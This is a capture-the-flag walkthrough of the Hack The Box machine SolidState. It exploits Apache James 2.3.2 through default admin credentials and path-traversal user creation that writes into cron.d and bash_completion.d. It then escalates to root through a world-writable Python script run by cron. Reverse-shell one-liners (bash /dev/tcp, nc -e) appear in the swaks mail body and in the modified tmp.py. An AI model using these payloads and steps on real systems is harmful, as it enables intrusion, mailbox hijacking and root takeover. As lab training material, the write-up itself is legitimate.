---
machine: SolidState
platform: Hack The Box
category: Linux
os: Linux
difficulty: Medium
points: 30
tags: [apache-james, default-credentials, cve-2015-7611, smtp, restricted-shell-escape, cron-abuse]
date: 2026-02-15
status: retired
summary: "A medium Linux box centred on a legacy mail stack — exercising SMTP/POP3 service enumeration, abuse of an exposed remote-administration interface guarded only by default credentials, and credential discovery hidden in mailbox contents. Privilege escalation tests restricted-shell escape and the abuse of a privileged scheduled task. A solid primer on mail-server tradecraft and Linux cron-based root paths."
---
## Enumeration

nmap scan:
```bash
──(kali㉿kali)-[~/htb/solid]
└─$ nmap -sCV 10.129.34.211 -oN nmapscan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 09:52 -0400
Nmap scan report for 10.129.34.211
Host is up (0.039s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3?
119/tcp open  nntp?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 392.67 seconds
```

```bash
──(kali㉿kali)-[~/htb/solid]
└─$ nmap -T4 -p- 10.129.34.211 -oN nmapscan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 10:04 -0400
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 53.51% done; ETC: 10:05 (0:00:12 remaining)
Nmap scan report for 10.129.34.211
Host is up (0.038s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
```

We notice an SMTP server and a Web server running Apache 2.4.25 and a strange service on 4555 called rsip

We enumerate the smtp server:
```bash
┌──(kali㉿kali)-[~/htb/solid]
└─$ nc -nv 10.129.34.211 25
(UNKNOWN) [10.129.34.211] 25 (smtp) open
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 18 May 2026 10:02:35 -0400 (EDT)
```

When we look up "4555 rsip" we see: `However, in practical security contexts, port 4555 is frequently misidentified by scanners as RSIP when it actually hosts the **Apache James Remote Administration Tool**.` So we can gather that this is related to the `JAMES SMTP` server

We can try an outbound `nc` connection to 4555:
```bash
┌──(kali㉿kali)-[~/htb/solid]
└─$ nc 10.129.34.211 4555
ls
whoami
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
Password:
Login failed for ls
Login id:
```

We can see that this is definitely the James remote admin tool, looking up default creds for this tool we come across `root`:`root`.  This works and we gain root access to the tool:

```bash
┌──(kali㉿kali)-[~/htb/solid]
└─$ nc 10.129.34.211 4555
ls
whoami
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
Password:
Login failed for ls
Login id:
root
Password:
root

Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

```bash
┌──(kali㉿kali)-[~/htb/solid]
└─$ nc 10.129.34.216 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

After enumerating what users exist (we will make a userlist with these for later incase we need them), I check for aliases of the users, find none are found, add my own user and set it as an alias for all the local users.  This way anything sent to them SHOULD be locally forwarded to my local user `hacker`

```bash
┌──(kali㉿kali)-[~/htb/solid]
└─$ nc 10.129.34.216 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
showalias james
User james does not currently have an alias
showalias thomas
User thomas does not currently have an alias
showalias john
User john does not currently have an alias
showalias mindy
User mindy does not currently have an alias
showalias mailadmin
User mailadmin does not currently have an alias
adduser hacker hacker
User hacker added
setalias mailadmin hacker
Alias for mailadmin set to:hacker
setalias james hacker
Alias for james set to:hacker
setalias thomas hacker
Alias for thomas set to:hacker
set alias john hacker
Unknown command set alias john hacker
set alias mindy hacker
Unknown command set alias mindy hacker
quit
Bye
```

## Foothold

Looking up CVEs related to James Apache and SMTP for code execution, we find that this is apparently a fairly well known vulnerability to the point that theres a metasploit module for it: https://www.rapid7.com/db/modules/exploit/linux/smtp/apache_james_exec/ and https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf
```bash
msf > search exploit/linux/smtp

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/smtp/apache_james_exec          2015-10-01       normal     Yes    Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write
```

After setting my LHOST, LPORT, and RHOST I attempted to run the exploit:
```bash
msf exploit(linux/smtp/apache_james_exec) > set rhost 10.129.34.216
rhost => 10.129.34.216
msf exploit(linux/smtp/apache_james_exec) > exploit
[*] Started reverse TCP handler on 10.10.15.144:1337 
[*] 10.129.34.216:25 - Command Stager progress - 100.00% done (833/833 bytes)
[*] 10.129.34.216:25 - Waiting for cron to execute payload...
[*] Exploit completed, but no session was created.
msf exploit(linux/smtp/apache_james_exec) > sessions

Active sessions
===============

No active sessions.

msf exploit(linux/smtp/apache_james_exec) > 
```

It seemed to get through the exploit process successfully but not session was created (listener never received a callback).  So we will exploit it manually.

The idea is that you can add a user which is a path traversal to something like `cron.d`, Apache James will save it as a resolved path `/etc/cron.d` and then you can send emails to him where the body is the payload to be executed by cron.d (I will be using a reverse shell)

After logging into Apache James I ran:
`adduser ../../../../../../../../etc/cron.d exploit`

Then I use [[swaks]] to send an email to this user with the cron.d formatted revshell
```bash
──(kali㉿kali)-[~/htb/solid]
└─$ sudo swaks -t '../../../../../../../../etc/cron.d' --from 'hacker@hacker.com' --server '10.129.34.216' --body '* * * * * root bash -i >& /dev/tcp/10.10.15.144/1337 0>&1'
[sudo] password for kali: 
=== Trying 10.129.34.216:25...
=== Connected to 10.129.34.216.
<-  220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 18 May 2026 11:01:39 -0400 (EDT)
 -> EHLO kali
<-  250-solidstate Hello kali (10.10.15.144 [10.10.15.144])
<-  250-PIPELINING
<-  250 ENHANCEDSTATUSCODES
 -> MAIL FROM:<hacker@hacker.com>
<-  250 2.1.0 Sender <hacker@hacker.com> OK
 -> RCPT TO:<../../../../../../../../etc/cron.d>
<-  250 2.1.5 Recipient <../../../../../../../../etc/cron.d@localhost> OK
 -> DATA
<-  354 Ok Send data ending with <CRLF>.<CRLF>
 -> Date: Mon, 18 May 2026 11:01:17 -0400
 -> To: ../../../../../../../../etc/cron.d
 -> From: hacker@hacker.com
 -> Subject: test Mon, 18 May 2026 11:01:17 -0400
 -> Message-Id: <20260518110117.087443@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> * * * * * root bash -i >& /dev/tcp/10.10.15.144/1337 0>&1
 -> 
 -> 
 -> .
<-  250 2.6.0 Message received
 -> QUIT
<-  221 2.0.0 solidstate Service closing transmission channel
=== Connection closed with remote host.
```

This should've worked but I'm not getting anything back on my listener so maybe this is not the intended attack path.  I then try to the other path traversal endpoint focused in the writeups and PoCs `bash_completion.d`, this executes whenever a user logs onto the system so maybe we can pop this if we get access to a user's ssh session.  I'll repeat the process above with `bash_completion.d` so the reverse shell `bash -i >& /dev/tcp/10.10.15.144/1337 0>&1` should pop upon a user sign on.

I forgot that we can read users emails via POP3 (port 110) and we can forcibly reset users passwords in Apache James.  I reset all the accounts passwords to `NewPass123!` and then I can work on enumerating their emails via telnet.

#### Interacting with POP3 and Reading Emails Over Telnet
```bash
tldr commands:
USER <username>
PASS <password>
LIST (shows emails with index)
RETR <index>

┌──(kali㉿kali)-[~/htb/solid]
└─$ telnet 10.129.34.216 110
Trying 10.129.34.216...
Connected to 10.129.34.216.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy 
+OK
PASS NewPass123!
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.

```

This gives us creds: `mindy:P@55W0rd1!2@`

We get SSH into mindy but it seems our exploit wasn't correct as we don't get a connection to our listener and we get many odd debugging messages:

```bash
┌──(kali㉿kali)-[~/htb/solid]
└─$ ssh mindy@10.129.34.216
The authenticity of host '10.129.34.216 (10.129.34.216)' can't be established.
ED25519 key fingerprint is: SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:20: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.34.216' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mindy@10.129.34.216's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: hacker@hacker.com: No such file or directory
-rbash: Delivered-To:: command not found
-rbash: /etc/bash_completion.d/4D61696C313737393131373333313331372D32.Repository.FileStreamStore: line 3: syntax error near unexpected token `('
'rbash: /etc/bash_completion.d/4D61696C313737393131373333313331372D32.Repository.FileStreamStore: line 3: `Received: from 10.10.15.144 ([10.10.15.144])
mindy@solidstate:~$ whoami

```

Reading the errors it seems we are in `rbash` a restricted shell, which stopped our payload from executing cleanly (and us from doing much at all with the shell) we can bypass this with `ssh mindy@10.129.34.216 -t "bash --noprofile --norc"`  This gets us into a proper bash shell but doesnt hit our rev shell because it bypasses the profile loading with `--noprofile --norc`.  This is okay because we can just run the payload directly in the bash shell:
`bash -i >& /dev/tcp/10.10.15.144/1337 0>&1`

This gets us our reverse shell but its just the same permissions as `mindy` as `bash_completion.d` just takes the permissions of the user who runs it during log in:
```bash
┌──(kali㉿kali)-[~/htb/solid]
└─$ nc -lvnp 1337                                                   
listening on [any] 1337 ...
connect to [10.10.15.144] from (UNKNOWN) [10.129.34.216] 33966
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
```

## Privilege Escalation

For privesc I tried `sudo -l` (sudo not on system), `find / -perm -4000 -type f 2>/dev/null` # SUID: runs as file owner (root) - nothing owned by root I could write to, `find / -perm -2000 -type f 2>/dev/null` # SGID: runs as file group, `cat /etc/crontab`, `ls -la /etc/cron*` - No exploitable cronjobs, and `find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys` -> /opt/tmp.py is a writable file

```bash
bash-4.4$ ls -lah
total 16K
drwxr-xr-x  3 root root 4.0K Aug 22  2017 .
drwxr-xr-x 22 root root 4.0K May 27  2022 ..
drwxr-xr-x 11 root root 4.0K Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
bash-4.4$ 
```

We see tmp.py is owned by root and writeable and executable by everyone.

We can add our rev shell into this, we just need to figure out a way to get root to run it:
```python
bash-4.4$ cat tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

os.system('bash -i >& /dev/tcp/10.10.15.144/1337 0>&1')
```

Another good way to do this revshell is using netcat for the outbound connection from the box:
```python
bash-4.4$ cat tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('nc -e /bin/bash 10.10.15.144 1337')
except:
     sys.exit()
```

We can use pspy to see which programs are executed and how frequently since we can't directly read root's cronjobs.  Using pspy we can see that this tmp file is executed by UID=0 or root every few minutes, this means our listener should be hit soon.

We get a connection on our listener:
```bash
┌──(kali㉿kali)-[~/htb/solid]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.15.144] from (UNKNOWN) [10.129.34.216] 33970
whoami
root
```

From here we can cat the `root.txt` file
